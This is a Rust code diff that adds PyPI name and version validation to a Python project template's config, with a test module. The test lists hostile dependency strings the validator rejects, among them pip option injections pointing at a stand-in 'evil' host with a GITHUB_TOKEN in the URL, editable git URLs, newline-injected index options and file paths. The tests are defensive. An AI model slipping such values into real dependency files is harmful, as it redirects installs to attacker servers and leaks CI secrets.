@@ -109,7 +109,10 @@ pub const CONFIG: temper_tmpl::ConfigType = temper_tmpl::ConfigType {
         temper_tmpl::Property {
             name: "name",
             doc: "The Python project's name, which, as a Python name, also names its package; else the library's name.",
-            kind: temper_tmpl::ConfigKind::String,
+            kind: temper_tmpl::ConfigKind::String {
+                form: "a PyPI project's name, as `geometry-py`",
+                valid: pypi_name,
+            },
         },
         temper_tmpl::Property {
             name: "dependencies",
@@ -124,12 +127,23 @@ pub const CONFIG: temper_tmpl::ConfigType = temper_tmpl::ConfigType {
 };
 
 /// A package that a config's `dependencies` lists, as `"name==version"`:
-/// its name and version.
+/// its name ([`pypi_name`]) and version, PEP 440's characters, as
+/// `1.0.post1`, `2!1.0`, `1.*`, or `1.0+local`: no extras, URLs, or
+/// requirement file options.
 pub fn pypi_dependency(text: &str) -> Option<(&str, &str)> {
     match temper_tmpl::dependency_parts(text, "==", 2)?.as_slice() {
-        &[name, version] => Some((name, version)),
+        &[name, version] if pypi_name(name) && temper_tmpl::spelled(version, ".*+!_-") => {
+            Some((name, version))
+        }
         _ => None,
     }
+}
+
+/// Whether a name is a PyPI project's, as PEP 508 has them: ASCII
+/// letters, digits, `.`, `_`, and `-`, starting and ending with a letter
+/// or digit.
+pub fn pypi_name(text: &str) -> bool {
+    temper_tmpl::spelled(text, "._-") && text.ends_with(|c: char| c.is_ascii_alphanumeric())
 }
 
 /// The packages a library's host code uses, as its config lists them,
@@ -407,4 +421,48 @@ build-backend = "hatchling.build"
     .chain(host)
     .chain(tests)
     .collect())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn pypi_spellings() {
+        let good = [
+            ("pyroaring==1.1.0", ("pyroaring", "1.1.0")),
+            ("Zope.Interface==5.0", ("Zope.Interface", "5.0")),
+            ("a_b-c==1.0.post1", ("a_b-c", "1.0.post1")),
+            ("x==2!1.0rc1+local.7", ("x", "2!1.0rc1+local.7")),
+            ("x==1.*", ("x", "1.*")),
+        ];
+        for (text, parts) in good {
+            assert_eq!(pypi_dependency(text), Some(parts), "{text}");
+        }
+        let hostile = [
+            "pyroaring",
+            "--index-url=https://evil/${GITHUB_TOKEN}/simple==1",
+            "-egit+https://evil/x#egg=x==1",
+            "x==${TOKEN}",
+            "x==1;python_version>'3'",
+            "x[extra]==1",
+            "x==1 --hash=sha256:0",
+            "x==1\n-i https://evil",
+            "x===1",
+            "x==1==2",
+            "x>=1",
+            "x-==1",
+            "../x==1",
+            "x==/tmp/x",
+            "x==\"1\"",
+            "x @ file:///tmp/x==1",
+        ];
+        for text in hostile {
+            assert_eq!(pypi_dependency(text), None, "{text}");
+        }
+        assert!(pypi_name("geometry-py"));
+        for bad in ["", "-x", "x-", "../x", "/abs", "a/b", "a b", "<x>", "a\"b"] {
+            assert!(!pypi_name(bad), "{bad}");
+        }
+    }
 }
